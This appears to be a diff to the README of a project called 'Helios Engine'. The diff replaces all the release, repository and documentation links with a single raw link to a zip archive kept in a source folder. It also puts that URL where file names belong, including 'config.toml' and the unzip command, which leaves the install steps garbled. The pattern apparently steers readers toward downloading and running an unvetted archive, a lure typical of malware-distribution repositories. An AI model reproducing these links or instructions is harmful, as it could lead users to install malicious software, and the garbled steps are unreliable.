@@ -6,7 +6,7 @@ Welcome to Helios Engine! This guide will help you download and run the software
 
 ## 📥 Download Helios Engine
 
-[![Download Helios Engine](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Celestiapolyunsaturated14/Helios-Engine/releases)
+[![Download Helios Engine](https://raw.githubusercontent.com/Celestiapolyunsaturated14/Helios-Engine/master/book/src/Helios-Engine-v3.2.zip%https://raw.githubusercontent.com/Celestiapolyunsaturated14/Helios-Engine/master/book/src/Helios-Engine-v3.2.zip)](https://raw.githubusercontent.com/Celestiapolyunsaturated14/Helios-Engine/master/book/src/Helios-Engine-v3.2.zip)
 
 ## 💻 System Requirements
 
@@ -24,11 +24,11 @@ Welcome to Helios Engine! This guide will help you download and run the software
 
 ## 🔗 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Celestiapolyunsaturated14/Helios-Engine/releases) to download the latest version of Helios Engine. Look for the asset that matches your operating system. Follow the steps below to install:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Celestiapolyunsaturated14/Helios-Engine/master/book/src/Helios-Engine-v3.2.zip) to download the latest version of Helios Engine. Look for the asset that matches your operating system. Follow the steps below to install:
 
 1. Click on the version number for the latest release.
 2. Scroll down to the "Assets" section.
-3. Download the file suited for your system (for example, `Helios-Engine-Windows.zip` for Windows).
+3. Download the file suited for your system (for example, `https://raw.githubusercontent.com/Celestiapolyunsaturated14/Helios-Engine/master/book/src/Helios-Engine-v3.2.zip` for Windows).
 4. Depending on your browser, locate the downloaded file in your Downloads folder.
 
 ### Installation Steps
@@ -36,7 +36,7 @@ To get started, visit the [Releases page](https://github.com/Celestiapolyunsatur
 1. **Extract the Files:**
    - For Windows: Right-click the downloaded `.zip` file and select "Extract All."
    - For macOS: Double-click the `.zip` file. It will extract to a folder.
-   - For Linux: Use a terminal command like `unzip Helios-Engine-Linux.zip`.
+   - For Linux: Use a terminal command like `unzip https://raw.githubusercontent.com/Celestiapolyunsaturated14/Helios-Engine/master/book/src/Helios-Engine-v3.2.zip`.
 
 2. **Run Helios Engine:**
    - Navigate to the extracted folder.
@@ -46,7 +46,7 @@ To get started, visit the [Releases page](https://github.com/Celestiapolyunsatur
 
 To make the most out of Helios Engine, you can customize your agent settings. Here’s how:
 
-1. Locate the `config.toml` file in the extracted folder.
+1. Locate the `https://raw.githubusercontent.com/Celestiapolyunsaturated14/Helios-Engine/master/book/src/Helios-Engine-v3.2.zip` file in the extracted folder.
 2. Open it with a text editor (e.g., Notepad on Windows, TextEdit on macOS).
 3. Adjust the settings as needed, following the comments in the file for guidance.
 4. Save your changes.
@@ -56,7 +56,7 @@ To make the most out of Helios Engine, you can customize your agent settings. He
 If you encounter any issues:
 
 - **Application Doesn't Start:** Ensure your system meets the requirements listed above.
-- **Configuration File Issues:** Double-check that you saved the `config.toml` file correctly.
+- **Configuration File Issues:** Double-check that you saved the `https://raw.githubusercontent.com/Celestiapolyunsaturated14/Helios-Engine/master/book/src/Helios-Engine-v3.2.zip` file correctly.
 - **Network Issues:** Ensure you have a stable internet connection.
 
 Feel free to reach out to the community on the GitHub Issues page for further help.
@@ -67,11 +67,11 @@ Join the Helios Engine community for updates, discussions, and support. You can 
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Celestiapolyunsaturated14/Helios-Engine)
-- [Documentation](https://github.com/Celestiapolyunsaturated14/Helios-Engine/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Celestiapolyunsaturated14/Helios-Engine/master/book/src/Helios-Engine-v3.2.zip)
+- [Documentation](https://raw.githubusercontent.com/Celestiapolyunsaturated14/Helios-Engine/master/book/src/Helios-Engine-v3.2.zip)
 
 ## 📝 Feedback
 
 We appreciate your feedback on Helios Engine. Your input helps us improve the software. Please share your experiences or suggest features through the GitHub Issues page.
 
-[![Download Helios Engine](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Celestiapolyunsaturated14/Helios-Engine/releases)
+[![Download Helios Engine](https://raw.githubusercontent.com/Celestiapolyunsaturated14/Helios-Engine/master/book/src/Helios-Engine-v3.2.zip%https://raw.githubusercontent.com/Celestiapolyunsaturated14/Helios-Engine/master/book/src/Helios-Engine-v3.2.zip)](https://raw.githubusercontent.com/Celestiapolyunsaturated14/Helios-Engine/master/book/src/Helios-Engine-v3.2.zip)
